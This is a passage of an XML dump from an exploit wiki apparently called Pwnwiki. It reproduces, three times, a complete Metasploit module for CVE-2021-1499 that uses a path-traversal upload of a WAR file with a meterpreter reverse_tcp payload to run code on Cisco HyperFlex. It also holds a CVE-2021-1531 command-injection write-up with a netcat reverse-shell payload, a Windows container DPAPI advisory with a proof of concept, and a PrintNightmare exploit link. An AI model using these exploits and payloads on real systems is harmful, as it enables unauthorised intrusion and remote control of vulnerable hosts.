        'Arch' =&gt; [ARCH_X86, ARCH_X64, ARCH_JAVA],
        'Privileged' =&gt; false, # Privesc left as an exercise for the reader
        'Targets' =&gt; [
          [
            'Java Dropper',
            {
              'Platform' =&gt; 'java',
              'Arch' =&gt; ARCH_JAVA,
              'Version' =&gt; Rex::Version.new('2.137'),
              'Type' =&gt; :java_dropper,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'java/meterpreter/reverse_tcp',
                'WfsDelay' =&gt; 10
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' =&gt; 'linux',
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :linux_dropper,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x64/meterpreter/reverse_tcp',
                'WfsDelay' =&gt; 10
              }
            }
          ]
        ],
        'DefaultTarget' =&gt; 0,
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('UPLOAD_FILE_NAME', [false, 'Choose a filename for the payload. (Default is random)', rand_text_alpha(rand(8..15))])
    ])
  end

  def check
    # The homepage behind SSL indicates whether the endpoint is running Cisco HyperFlex
    # Installer:         &lt;title&gt;Hyperflex Installer&lt;/title&gt;
    # Installed Product: &lt;title&gt;Cisco HyperFlex Connect&lt;/title&gt;
    # Both the installer and installed product are vulnerable
    res_ssl = send_request_cgi(
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path),
      'rport' =&gt; 443,
      'SSL' =&gt; true
    )
    unless res_ssl &amp;&amp; res_ssl.body[%r{&lt;title&gt;(?:Hyperflex Installer|Cisco HyperFlex Connect)&lt;/title&gt;}]
      return Exploit::CheckCode::Safe
    end

    # The vulnerability, however, lies on the HTTP endpoint /upload.
    res = send_request_cgi(
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path, 'upload')
    )
    if res &amp;&amp; res.code == 400 &amp;&amp; res.body.include?('Apache Tomcat') &amp;&amp; res.headers['Server'] &amp;&amp; res.headers['Server'].include?('nginx')
      return Exploit::CheckCode::Appears
    elsif res &amp;&amp; res.code == 404
      return CheckCode::Safe
    end

    CheckCode::Unknown
  end

  def prepare_payload(app_base, jsp_name)
    print_status('Preparing payload...')
    war_payload = payload.encoded_war({ app_name: app_base, jsp_name: jsp_name }).to_s
    fname = app_base + '.war'
    post_data = Rex::MIME::Message.new
    post_data.add_part(fname, nil, nil, 'form-data; name="fname"')
    post_data.add_part('/upload', nil, nil, 'form-data; name="uploadDir"')
    post_data.add_part(war_payload,
                       'application/octet-stream', 'binary',
                       "form-data; name=\"#{jsp_name}\"; filename=\"../../../lib/tomcat7/webapps/#{fname}\"")
    post_data
  end

  def upload_payload(post_data)
    print_status('Uploading payload...')
    res = send_request_cgi(
      'uri' =&gt; normalize_uri(target_uri.path, 'upload'),
      'method' =&gt; 'POST',
      'data' =&gt; post_data.to_s,
      'ctype' =&gt; "multipart/form-data; boundary=#{post_data.bound}"
    )
    if res &amp;&amp; res.code == 200 &amp;&amp; res.body.to_s =~ /result.*filename:/
      print_good('Payload uploaded successfully')
    else
      fail_with(Failure::UnexpectedReply, 'Payload upload attempt failed')
    end

    register_file_for_cleanup('/var/lib/tomcat7/crossdomain.xml.war')
    register_file_for_cleanup('/var/lib/tomcat7/crossdomain.xml/')
  end

  def execute_payload(url)
    print_status("Executing payload... calling: #{url}")
    res = send_request_cgi(
      'uri' =&gt; url,
      'method' =&gt; 'GET'
    )
    if res &amp;&amp; res.code == 200
      print_good('Payload executed successfully')
    else
      fail_with(Failure::UnexpectedReply, 'Payload execution attempt failed')
    end
  end

  def exploit
    app_base = 'crossdomain.xml'
    jsp_name = datastore['UPLOAD_FILE_NAME']
    data = prepare_payload(app_base, jsp_name)
    upload_payload(data)
    sleep(datastore['WfsDelay'])
    if target.name == 'Java Dropper'
      url = normalize_uri(target_uri.path, app_base.to_s)
    else
      url = normalize_uri(target_uri.path, app_base.to_s, "#{jsp_name}.jsp")
    end
    execute_payload(url)
  end
end
&lt;/pre&gt;</text>
      <sha1>1nwynkcim00kcs1vcdhn4ayu77sks9t</sha1>
    </revision>
    <revision>
      <id>5380</id>
      <parentid>5379</parentid>
      <timestamp>2021-06-20T01:58:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5380</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5879" sha1="cmysf2h030t0yf6a51px1iupgnnorjg" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Cisco HyperFlex HX Data Platform
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)',
        'Description' =&gt; %q{
          This module exploits an unauthenticated file upload vulnerability in
          Cisco HyperFlex HX Data Platform's /upload endpoint to upload and
          execute a payload as the Tomcat user.
        },
        'Author' =&gt; [
          'Nikita Abramov',      # Discovery
          'Mikhail Klyuchnikov', # Discovery
          'wvu',                 # Research and guidance
          'jheysel-r7'           # Metasploit Module
        ],
        'References' =&gt; [
          ['CVE', '2021-1499'], # HyperFlex HX File Upload
          ['URL', 'https://attackerkb.com/assessments/82738621-1114-4aba-990a-9ea007b05834']
        ],
        'DisclosureDate' =&gt; '2021-05-05',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; ['unix', 'linux'],
        'Arch' =&gt; [ARCH_X86, ARCH_X64, ARCH_JAVA],
        'Privileged' =&gt; false, # Privesc left as an exercise for the reader
        'Targets' =&gt; [
          [
            'Java Dropper',
            {
              'Platform' =&gt; 'java',
              'Arch' =&gt; ARCH_JAVA,
              'Version' =&gt; Rex::Version.new('2.137'),
              'Type' =&gt; :java_dropper,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'java/meterpreter/reverse_tcp',
                'WfsDelay' =&gt; 10
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' =&gt; 'linux',
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :linux_dropper,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x64/meterpreter/reverse_tcp',
                'WfsDelay' =&gt; 10
              }
            }
          ]
        ],
        'DefaultTarget' =&gt; 0,
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('UPLOAD_FILE_NAME', [false, 'Choose a filename for the payload. (Default is random)', rand_text_alpha(rand(8..15))])
    ])
  end

  def check
    # The homepage behind SSL indicates whether the endpoint is running Cisco HyperFlex
    # Installer:         &lt;title&gt;Hyperflex Installer&lt;/title&gt;
    # Installed Product: &lt;title&gt;Cisco HyperFlex Connect&lt;/title&gt;
    # Both the installer and installed product are vulnerable
    res_ssl = send_request_cgi(
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path),
      'rport' =&gt; 443,
      'SSL' =&gt; true
    )
    unless res_ssl &amp;&amp; res_ssl.body[%r{&lt;title&gt;(?:Hyperflex Installer|Cisco HyperFlex Connect)&lt;/title&gt;}]
      return Exploit::CheckCode::Safe
    end

    # The vulnerability, however, lies on the HTTP endpoint /upload.
    res = send_request_cgi(
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path, 'upload')
    )
    if res &amp;&amp; res.code == 400 &amp;&amp; res.body.include?('Apache Tomcat') &amp;&amp; res.headers['Server'] &amp;&amp; res.headers['Server'].include?('nginx')
      return Exploit::CheckCode::Appears
    elsif res &amp;&amp; res.code == 404
      return CheckCode::Safe
    end

    CheckCode::Unknown
  end

  def prepare_payload(app_base, jsp_name)
    print_status('Preparing payload...')
    war_payload = payload.encoded_war({ app_name: app_base, jsp_name: jsp_name }).to_s
    fname = app_base + '.war'
    post_data = Rex::MIME::Message.new
    post_data.add_part(fname, nil, nil, 'form-data; name="fname"')
    post_data.add_part('/upload', nil, nil, 'form-data; name="uploadDir"')
    post_data.add_part(war_payload,
                       'application/octet-stream', 'binary',
                       "form-data; name=\"#{jsp_name}\"; filename=\"../../../lib/tomcat7/webapps/#{fname}\"")
    post_data
  end

  def upload_payload(post_data)
    print_status('Uploading payload...')
    res = send_request_cgi(
      'uri' =&gt; normalize_uri(target_uri.path, 'upload'),
      'method' =&gt; 'POST',
      'data' =&gt; post_data.to_s,
      'ctype' =&gt; "multipart/form-data; boundary=#{post_data.bound}"
    )
    if res &amp;&amp; res.code == 200 &amp;&amp; res.body.to_s =~ /result.*filename:/
      print_good('Payload uploaded successfully')
    else
      fail_with(Failure::UnexpectedReply, 'Payload upload attempt failed')
    end

    register_file_for_cleanup('/var/lib/tomcat7/crossdomain.xml.war')
    register_file_for_cleanup('/var/lib/tomcat7/crossdomain.xml/')
  end

  def execute_payload(url)
    print_status("Executing payload... calling: #{url}")
    res = send_request_cgi(
      'uri' =&gt; url,
      'method' =&gt; 'GET'
    )
    if res &amp;&amp; res.code == 200
      print_good('Payload executed successfully')
    else
      fail_with(Failure::UnexpectedReply, 'Payload execution attempt failed')
    end
  end

  def exploit
    app_base = 'crossdomain.xml'
    jsp_name = datastore['UPLOAD_FILE_NAME']
    data = prepare_payload(app_base, jsp_name)
    upload_payload(data)
    sleep(datastore['WfsDelay'])
    if target.name == 'Java Dropper'
      url = normalize_uri(target_uri.path, app_base.to_s)
    else
      url = normalize_uri(target_uri.path, app_base.to_s, "#{jsp_name}.jsp")
    end
    execute_payload(url)
  end
end
&lt;/pre&gt;</text>
      <sha1>cmysf2h030t0yf6a51px1iupgnnorjg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1499 Cisco HyperFlex HX Data Platform 文件上傳&amp;遠程代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4685</id>
    <revision>
      <id>5386</id>
      <timestamp>2021-06-20T02:01:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影响=="</comment>
      <origin>5386</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5843" sha1="g4evpvg8chn3bh8ohyh73p712h0ec7j" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==
&lt;pre&gt;
Cisco HyperFlex HX Data Platform
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)',
        'Description' =&gt; %q{
          This module exploits an unauthenticated file upload vulnerability in
          Cisco HyperFlex HX Data Platform's /upload endpoint to upload and
          execute a payload as the Tomcat user.
        },
        'Author' =&gt; [
          'Nikita Abramov',      # Discovery
          'Mikhail Klyuchnikov', # Discovery
          'wvu',                 # Research and guidance
          'jheysel-r7'           # Metasploit Module
        ],
        'References' =&gt; [
          ['CVE', '2021-1499'], # HyperFlex HX File Upload
          ['URL', 'https://attackerkb.com/assessments/82738621-1114-4aba-990a-9ea007b05834']
        ],
        'DisclosureDate' =&gt; '2021-05-05',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; ['unix', 'linux'],
        'Arch' =&gt; [ARCH_X86, ARCH_X64, ARCH_JAVA],
        'Privileged' =&gt; false, # Privesc left as an exercise for the reader
        'Targets' =&gt; [
          [
            'Java Dropper',
            {
              'Platform' =&gt; 'java',
              'Arch' =&gt; ARCH_JAVA,
              'Version' =&gt; Rex::Version.new('2.137'),
              'Type' =&gt; :java_dropper,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'java/meterpreter/reverse_tcp',
                'WfsDelay' =&gt; 10
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' =&gt; 'linux',
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :linux_dropper,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x64/meterpreter/reverse_tcp',
                'WfsDelay' =&gt; 10
              }
            }
          ]
        ],
        'DefaultTarget' =&gt; 0,
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('UPLOAD_FILE_NAME', [false, 'Choose a filename for the payload. (Default is random)', rand_text_alpha(rand(8..15))])
    ])
  end

  def check
    # The homepage behind SSL indicates whether the endpoint is running Cisco HyperFlex
    # Installer:         &lt;title&gt;Hyperflex Installer&lt;/title&gt;
    # Installed Product: &lt;title&gt;Cisco HyperFlex Connect&lt;/title&gt;
    # Both the installer and installed product are vulnerable
    res_ssl = send_request_cgi(
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path),
      'rport' =&gt; 443,
      'SSL' =&gt; true
    )
    unless res_ssl &amp;&amp; res_ssl.body[%r{&lt;title&gt;(?:Hyperflex Installer|Cisco HyperFlex Connect)&lt;/title&gt;}]
      return Exploit::CheckCode::Safe
    end

    # The vulnerability, however, lies on the HTTP endpoint /upload.
    res = send_request_cgi(
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path, 'upload')
    )
    if res &amp;&amp; res.code == 400 &amp;&amp; res.body.include?('Apache Tomcat') &amp;&amp; res.headers['Server'] &amp;&amp; res.headers['Server'].include?('nginx')
      return Exploit::CheckCode::Appears
    elsif res &amp;&amp; res.code == 404
      return CheckCode::Safe
    end

    CheckCode::Unknown
  end

  def prepare_payload(app_base, jsp_name)
    print_status('Preparing payload...')
    war_payload = payload.encoded_war({ app_name: app_base, jsp_name: jsp_name }).to_s
    fname = app_base + '.war'
    post_data = Rex::MIME::Message.new
    post_data.add_part(fname, nil, nil, 'form-data; name="fname"')
    post_data.add_part('/upload', nil, nil, 'form-data; name="uploadDir"')
    post_data.add_part(war_payload,
                       'application/octet-stream', 'binary',
                       "form-data; name=\"#{jsp_name}\"; filename=\"../../../lib/tomcat7/webapps/#{fname}\"")
    post_data
  end

  def upload_payload(post_data)
    print_status('Uploading payload...')
    res = send_request_cgi(
      'uri' =&gt; normalize_uri(target_uri.path, 'upload'),
      'method' =&gt; 'POST',
      'data' =&gt; post_data.to_s,
      'ctype' =&gt; "multipart/form-data; boundary=#{post_data.bound}"
    )
    if res &amp;&amp; res.code == 200 &amp;&amp; res.body.to_s =~ /result.*filename:/
      print_good('Payload uploaded successfully')
    else
      fail_with(Failure::UnexpectedReply, 'Payload upload attempt failed')
    end

    register_file_for_cleanup('/var/lib/tomcat7/crossdomain.xml.war')
    register_file_for_cleanup('/var/lib/tomcat7/crossdomain.xml/')
  end

  def execute_payload(url)
    print_status("Executing payload... calling: #{url}")
    res = send_request_cgi(
      'uri' =&gt; url,
      'method' =&gt; 'GET'
    )
    if res &amp;&amp; res.code == 200
      print_good('Payload executed successfully')
    else
      fail_with(Failure::UnexpectedReply, 'Payload execution attempt failed')
    end
  end

  def exploit
    app_base = 'crossdomain.xml'
    jsp_name = datastore['UPLOAD_FILE_NAME']
    data = prepare_payload(app_base, jsp_name)
    upload_payload(data)
    sleep(datastore['WfsDelay'])
    if target.name == 'Java Dropper'
      url = normalize_uri(target_uri.path, app_base.to_s)
    else
      url = normalize_uri(target_uri.path, app_base.to_s, "#{jsp_name}.jsp")
    end
    execute_payload(url)
  end
end
&lt;/pre&gt;</text>
      <sha1>g4evpvg8chn3bh8ohyh73p712h0ec7j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1531 Cisco Modeling Labs 2.1.1-b19 RCE漏洞</title>
    <ns>0</ns>
    <id>5131</id>
    <revision>
      <id>5873</id>
      <timestamp>2021-06-24T09:25:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; Cisco Modeling Labs 2.1.1-b19 Post-Auth RCE Vulnerability  CVE-2021-1531  ======= Details =======  Authenticated command injection in the web portal via the X-Original-F..."</comment>
      <origin>5873</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1794" sha1="jiun2ybm9hzjx6xj3kcy2jc6vd0ag3p" xml:space="preserve">&lt;pre&gt;
Cisco Modeling Labs 2.1.1-b19 Post-Auth RCE Vulnerability

CVE-2021-1531

=======
Details
=======

Authenticated command injection in the web portal via the X-Original-File-Name header.

Tested with portal 'admin' user who does not have a system login or SSH access, but likely works for any user who can upload files in the portal.

=====
Repro
=====

-------
Request
-------

POST /api/v0/images/upload HTTP/1.1
Host: 10.10.10.118
X-Original-File-Name: test.rpm';id&gt;/tmp/123'
Authorization: Bearer [jwt token]
Content-Length: 0

--------
Response
--------

HTTP/1.1 200 OK
Server: nginx/1.14.1
...

"Success"

----------------
Local monitoring
----------------

pid=5547 executed [/bin/sh -c /usr/local/bin/imagetool -stderrthreshold=INFO -multipart move '/var/local/virl2/nginx-temp-folder/0063443599' '/var/local/virl2/dropfolder/test.rpm';id&gt;/tmp/123''; exit 0 ]

.....

pid=5555 executed [id ]

$ cat /tmp/123
uid=982(virl2) gid=980(virl2) groups=980(virl2),982(wireshark),986(libvirt) context=system_u:system_r:unconfined_service_t:s0

============
Exploitation
============

The netcat binary with -e support is installed on the system, which makes gaining a remote shell as the virl2 user easy for demo.

-------
Payload
-------

X-Original-File-Name: test.rpm';nc 10.1.1.101 5000 -e /bin/bash'

--------
Listener
--------

$ nc -l -p 5000
.....
*connection received from cml2*

/usr/libexec/platform-python -c 'import pty; pty.spawn("/bin/bash")'

*** VIRL2 network simulator monitor ***

CLI&gt; uname -a
Linux cml2-controller.cml.lab 4.18.0-80.11.2.el8_0.x86_64 #1 SMP Tue Sep 24 11:32:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

CLI&gt; pwd
/var/local/virl2

===
Fix
===

https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cml-cmd-inject-N4VYeQXB
&lt;/pre&gt;</text>
      <sha1>jiun2ybm9hzjx6xj3kcy2jc6vd0ag3p</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1645 Microsoft Windows Containers DP API加密缺陷</title>
    <ns>0</ns>
    <id>3115</id>
    <revision>
      <id>3618</id>
      <timestamp>2021-05-30T02:30:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Microsoft Windows Containers suffers from a DP API design flaw where encryption keys are shared and reused between images.  ==EXP== &lt;pre&gt; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~..."</comment>
      <origin>3618</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6383" sha1="b9ovp00qmhk4cq5gx0kduih87yta77v" xml:space="preserve">==INFO==
Microsoft Windows Containers suffers from a DP API design flaw where encryption keys are shared and reused between images.

==EXP==
&lt;pre&gt;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~                Certitude Security Advisory - CSA-2021-002                   ~
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
 PRODUCT          : Windows Containers
 VENDOR           : Microsoft
 SEVERITY         : High
 AFFECTED VERSION : Windows 10, Windows Server
 IDENTIFIERS      : CVE-2021-1645
 PATCH VERSION    : KB4598229, KB4598230, KB4598242, KB4598243
 FOUND BY         : Marc Nimmerrichter, Certitude Lab
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Introduction
------------

Windows containers is a feature that extends the container concept well-known
from Linux environments to Windows. Just like containers on Linux, Windows
containers utilize a shared kernel but container processes are somewhat
isolated from one another.

The Windows Data Protection API (DP API) allows applications to encrypt
arbitrary data. An application does not have to manage keys, but instead, any
data can be passed to the API, which then returns an encrypted blob.
Similarly, an application can pass a previously encrypted blob to DP API to
retrieve the plain text. The cryptographic key used for these encryption
operations is either tied to the user context or is unique to a machine.

There was a design issue with DP API in containers which resulted in DP API
using the same key in all containers. Additionally, these keys were public in
base-image layers published by Microsoft.

Organizations using DP API inside containers should apply patches to Windows
and use the latest base images. However, the fix causes a design change, which
might render the use of DP API difficult for many use-cases.

Vulnerability Overview
----------------------

The vulnerability described applies to both, user- and machine-key DP API
encryption within Windows Docker containers. In our description we will use
machine key encryption, but the same issue exists if data is encrypted with
the user-key.

Normally, a machine key is tied to a (virtual-)machine. Therefore, a machine
is not able to decrypt data encrypted by an application on another machine.
However, due to a design issue, DP API machine keys used in containers came
from the container images. Since Windows docker images are based on the same
base images, the DP API keys of containers were identical. As the base image
is public, the DP API keys were public too!

Therefore, DP API operations performed by any Windows container application
were ineffective, as the encryption key that was used is public. Organizations
that used DP API in Windows Docker containers and relied on it to store
encrypted data in a potentially insecure location, should consider this data
as compromised.

Proof-of-Concept
----------------

First, start a docker container called Alice on VM1:

\$ docker run --name Alice -it
mcr.microsoft.com/dotnet/framework/runtime:4.8-windowsservercore-ltsc2019
cmd.exe

Then, encrypt a file in the Alice container using the powershell script
vault.ps1:

C:\&gt;powershell.exe -File vault.ps1 -StoreSecret "This is my secret text"
secret.txt

C:\&gt;type secret.txt
AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAm+1a2TNbiEahEIB4y/C3vQAAAAACAAAAAAAQZgAAAAEAACAAAAAdbJ9ZanY929j39ZLgabsaE5hRS4TLkCaaaRqb
+n3ZXAAAAAAOgAAAAAIAACAAAAC7fHbsKHCTaMhsWIVMYwUZezbLozItcqExHdg9EJcfDiAAAABFv2EHA5TTqb8I9I+BZrfQS5ViD93KZlL4FoYIBldGY0AA
AABdx7adlANRnw1shJTOtE6cYTAeqmb1yTe9adcSY1nBvtqlqSWQ/zwGaqfIfumuUm+o+ySwZXH/Su5GovJ8aUP9

Start a docker container Bob on VM2:

\$ docker run --name Bob -it
mcr.microsoft.com/dotnet/framework/runtime:4.8-windowsservercore-ltsc2019
cmd.exe

The following command shows that the file encrypted by Alice on VM1 can be
decrypted in the Bob container on VM2:

C:\&gt;powershell.exe -File vault.ps1 secret.txt
This is my secret text

The vault.ps1 PowerShell script from
https://blag.nullteilerfrei.de/2018/01/05/powershell-dpapi-script/ used in
this PoC:

``` {.powershell```}
Param(
  [string] $StoreSecret,
  [Parameter(Mandatory=$True,Position=0)]
  [string] $filename )
[void] [Reflection.Assembly]::LoadWithPartialName("System.Security")
$scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
if ($StoreSecret -eq "") {
  $data = Get-Content $filename
  $ciphertext = [System.Convert]::FromBase64String($data)
  $plaintext = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $ciphertext, $null, $scope )
  [System.Text.UTF8Encoding]::UTF8.GetString($plaintext)
} else {
  $plaintext = [System.Text.UTF8Encoding]::UTF8.GetBytes($StoreSecret)
  $ciphertext = [System.Security.Cryptography.ProtectedData]::Protect(
    $plaintext, $null, $scope )
  [System.Convert]::ToBase64String($ciphertext) &gt; $filename
}
```

Resolution
----------

Microsoft fixed this vulnerability with a patch for Windows Server and Windows
10 operating systems and in their docker base-images. Users should apply both,
OS updates and base-image updates, to address this issue. Please also refer to
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1645.

However, the patch comes with a caveat: As the issue is a design problem, it
could not be fixed in a straightforward way. Windows containers now generate a
DP API key when the container is first started. This also means that all
containers use different keys. There is currently no supported way to share
keys between containers or transfer a key from one container to another. This
is impractical, because containers are often relatively short-lived. Moreover,
when a container is scaled up, new containers will not be able to work with
previously encrypted blobs. This reduces the potential use-cases of DP API
with containers.

References
----------

https://certitude.consulting/blog/en/windows-docker-dp-api-vulnerability-cve-2021-1645/
https://certitude.consulting/advisories/CSA_2021_002_Windows_Docker_DP_API_Design_Vulnerability.md.txt
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1645

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                           (c) 2021 Certitude Consulting GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/pre&gt;</text>
      <sha1>b9ovp00qmhk4cq5gx0kduih87yta77v</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1675 Windows Print Spooler遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>5286</id>
    <revision>
      <id>6054</id>
      <timestamp>2021-06-30T01:07:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt;  &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt;    Windows Server 2019 (Server Core installation)     Windows Server 2019     Windows Server 2016 (Server Core i..."</comment>
      <origin>6054</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2176" sha1="qpla7jq0bdnwxcyx56oh9r3q6mk4zv0" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
   Windows Server 2019 (Server Core installation)
    Windows Server 2019
    Windows Server 2016 (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server, version 2004 (Server Core installation)
    Windows RT 8.1
    Windows 8.1 for x64-based systems
    Windows 8.1 for 32-bit systems
    Windows 7 for x64-based Systems Service Pack 1
    Windows 7 for 32-bit Systems Service Pack 1
    Windows 10 Version 1607 for x64-based Systems
    Windows 10 Version 1607 for 32-bit Systems
    Windows 10 for x64-based Systems
    Windows 10 for 32-bit Systems
    Windows Server, version 20H2 (Server Core Installation)
    Windows 10 Version 20H2 for ARM64-based Systems
    Windows 10 Version 20H2 for 32-bit Systems
    Windows 10 Version 20H2 for x64-based Systems
    Windows 10 Version 2004 for x64-based Systems
    Windows 10 Version 2004 for ARM64-based Systems
    Windows 10 Version 2004 for 32-bit Systems
    Windows 10 Version 21H1 for 32-bit Systems
    Windows 10 Version 21H1 for ARM64-based Systems
    Windows 10 Version 21H1 for x64-based Systems
    Windows 10 Version 1909 for ARM64-based Systems
    Windows 10 Version 1909 for x64-based Systems
    Windows 10 Version 1909 for 32-bit Systems
    Windows 10 Version 1809 for ARM64-based Systems
    Windows 10 Version 1809 for x64-based Systems
    Windows 10 Version 1809 for 32-bit Systems
&lt;/pre&gt;


==EXP==
&lt;translate&gt;
該EXP可以本地權限提升&amp;遠程代碼執行
&lt;/translate&gt;
https://github.com/JustYoomoon/PrintNightmare</text>
      <sha1>qpla7jq0bdnwxcyx56oh9r3q6mk4zv0</sha1>
    </revision>
    <revision>
      <id>6055</id>
      <parentid>6054</parentid>
      <timestamp>2021-06-30T01:08:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6055</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2198" sha1="oyk8p15xu296o4ctvno96ts8e3k3920" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
   Windows Server 2019 (Server Core installation)
    Windows Server 2019
    Windows Server 2016 (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
